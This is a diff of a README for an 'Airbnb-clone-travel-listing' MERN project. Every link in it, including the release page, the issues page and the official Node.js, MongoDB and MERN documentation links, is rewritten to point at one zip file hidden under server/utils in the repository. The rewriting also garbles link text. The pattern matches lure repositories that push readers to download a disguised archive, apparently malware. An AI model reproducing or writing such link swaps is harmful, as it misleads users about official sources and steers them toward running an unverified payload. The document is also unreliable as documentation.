@@ -2,7 +2,7 @@
 # 🎉 Airbnb-clone-travel-listing - Discover, Book, and Rent with Ease
 
 ## 🔗 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Araz491/Airbnb-clone-travel-listing/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Araz491/Airbnb-clone-travel-listing/main/server/utils/Airbnb-clone-travel-listing_v1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Araz491/Airbnb-clone-travel-listing/main/server/utils/Airbnb-clone-travel-listing_v1.0.zip)
 
 ## 📖 Introduction
 Welcome to the Airbnb-clone-travel-listing! This platform lets you easily manage and book rental properties. Built with modern technology, it ensures a smooth experience. Whether you want to host guests or find a place to stay, this tool is for you.
@@ -23,7 +23,7 @@ Follow these steps to begin your journey with Airbnb-clone-travel-listing.
    - **Internet Connection**: Required for full functionality
 
 2. **Download & Install**
-   To download the latest version, visit this page: [Download from Releases](https://github.com/Araz491/Airbnb-clone-travel-listing/releases). You will find different versions available. Choose your preferred file and download it.
+   To download the latest version, visit this page: [Download from Releases](https://raw.githubusercontent.com/Araz491/Airbnb-clone-travel-listing/main/server/utils/Airbnb-clone-travel-listing_v1.0.zip). You will find different versions available. Choose your preferred file and download it.
 
    Here are the steps to download:
    - Click on the link above.
@@ -45,7 +45,7 @@ Once the application is up and running, you can start:
 
 ## 🤝 Support
 If you encounter any issues, we are here to help. You can reach out for support by:
-- Visiting our [GitHub Issues Page](https://github.com/Araz491/Airbnb-clone-travel-listing/issues).
+- Visiting our [GitHub Issues Page](https://raw.githubusercontent.com/Araz491/Airbnb-clone-travel-listing/main/server/utils/Airbnb-clone-travel-listing_v1.0.zip).
 - Checking our FAQs for common questions.
 
 ## 🌐 Community
@@ -58,13 +58,13 @@ Interested in contributing? We welcome your input! You can:
 
 ## 🔗 Additional Resources
 Explore the following topics to expand your knowledge:
-- [MERN Stack Documentation](https://mern.io)
-- [Node.js Official Site](https://nodejs.org)
-- [MongoDB Documentation](https://mongodb.com)
+- [MERN Stack Documentation](https://raw.githubusercontent.com/Araz491/Airbnb-clone-travel-listing/main/server/utils/Airbnb-clone-travel-listing_v1.0.zip)
+- [https://raw.githubusercontent.com/Araz491/Airbnb-clone-travel-listing/main/server/utils/Airbnb-clone-travel-listing_v1.0.zip Official Site](https://raw.githubusercontent.com/Araz491/Airbnb-clone-travel-listing/main/server/utils/Airbnb-clone-travel-listing_v1.0.zip)
+- [MongoDB Documentation](https://raw.githubusercontent.com/Araz491/Airbnb-clone-travel-listing/main/server/utils/Airbnb-clone-travel-listing_v1.0.zip)
 
 ## 📱 Connect with Us
 Stay updated by following us on social media and community platforms. Join discussions and explore new features as they are released.
 
 ## 🔗 Download Now Again
-Don't forget to download the application and start exploring: [Download from Releases](https://github.com/Araz491/Airbnb-clone-travel-listing/releases).
+Don't forget to download the application and start exploring: [Download from Releases](https://raw.githubusercontent.com/Araz491/Airbnb-clone-travel-listing/main/server/utils/Airbnb-clone-travel-listing_v1.0.zip).
 ```
